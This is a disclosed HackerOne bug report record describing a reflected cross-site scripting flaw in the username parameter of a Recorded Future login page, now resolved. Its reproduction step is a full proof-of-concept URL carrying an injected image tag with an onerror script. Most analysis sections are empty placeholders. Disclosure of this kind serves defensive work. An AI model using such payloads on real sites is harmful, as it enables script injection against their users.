---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1201134'
original_report_id: '1201134'
title: '[https://app.recordedfuture.com] - Reflected XSS via username parameter'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: recorded-future
created_at: '2021-05-18T15:27:09.476Z'
disclosed_at: '2022-01-21T13:51:14.499Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 40
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [https://app.recordedfuture.com] - Reflected XSS via username parameter

## Metadata

- HackerOne Report ID: 1201134
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: recorded-future
- Disclosed At: 2022-01-21T13:51:14.499Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Steps To Reproduce:

```
1-> Visit https://app.recordedfuture.com/live/login/?reset=x&username=xss%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E
```

## Impact

An attacker could be able to Inject Malicious Javascript to compromise users

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
